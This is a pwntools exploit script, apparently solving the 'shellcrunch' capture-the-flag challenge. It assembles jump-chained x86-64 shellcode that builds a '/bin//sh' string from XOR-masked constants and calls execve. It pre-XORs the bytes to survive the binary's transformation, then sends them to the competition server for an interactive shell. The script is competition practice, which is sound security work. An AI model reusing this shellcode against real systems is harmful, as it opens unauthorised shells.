from pwn import *

elf = context.binary = ELF('./shellcrunch', checksec=False)
context.terminal = ['alacritty', '-e', 'sh', '-c']

#io = process(['strace', './shellcrunch'])
io = process()
io = remote('chal.competitivecyber.club', 3004)
#gdb.attach(io)

shellcode = asm("""
    jmp sec1
    nop
    nop
    nop
    nop

    sec1:
    xor rax, 58
    xor edi, edi
    jmp sec2
    nop
    nop
    nop
    nop

    sec2:
    add rax, 1
    xor esi, esi
    jmp sec3
    nop
    nop
    nop
    nop

    sec3:
    xor rbx, rbx
    xor rcx, rcx
    jmp sec4
    nop
    nop
    nop
    nop

    sec4:
    xor rbx, 0xffffffffffffffff
    jmp sec5
    nop
    nop
    nop
    nop
    nop
    nop

    sec5:
    xor ecx, 0xff978cd0
    jmp sec6
    nop
    nop
    nop
    nop

    sec6:
    push rcx
    jmp sec7
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

    sec7:
    xor rcx, rcx
    xor rdx, rdx
    jmp sec8
    nop
    nop
    nop
    nop

    sec8:
    xor ecx, 0x91969dd0
    jmp sec9
    nop
    nop
    nop
    nop

    sec9:
    shl rcx, 32
    push rcx
    jmp sec10
    nop
    nop
    nop
    nop
    nop

    sec10:
    add rsp, 4
    jmp sec11
    nop
    nop
    nop
    nop
    nop
    nop

    sec11:
    xor rdi, rsp
    pop rcx
    jmp sec12
    nop
    nop
    nop
    nop
    nop
    nop

    sec12:
    xor rbx, rcx
    push rbx
    syscall
""")

xored_shellcode = bytearray(shellcode)

for i in range(2, len(shellcode), 0xc):
    if i + 3 < len(shellcode):
        #xored_shellcode[i] = 0xf4
        #xored_shellcode[i+1] = 0xf4
        #xored_shellcode[i+2] = 0xf4
        #xored_shellcode[i+3] = 0xf4
        if shellcode[i:i+4] != b'\x90\x90\x90\x90':
            print(f'ERROR: {shellcode[i:i+4]}')

for i in range(0, len(shellcode) - 1, 4):
    xored_shellcode[i] = shellcode[i] ^ shellcode[i+1]

for i in range(len(xored_shellcode)):
    if xored_shellcode[i] == 0 and xored_shellcode[i+1] == 0x90:
        xored_shellcode[i] = 0xff

print(f'shellcode: {shellcode}\n')
print(f'xored shellcode: {bytes(xored_shellcode)}\n')

io.send(xored_shellcode)

io.interactive()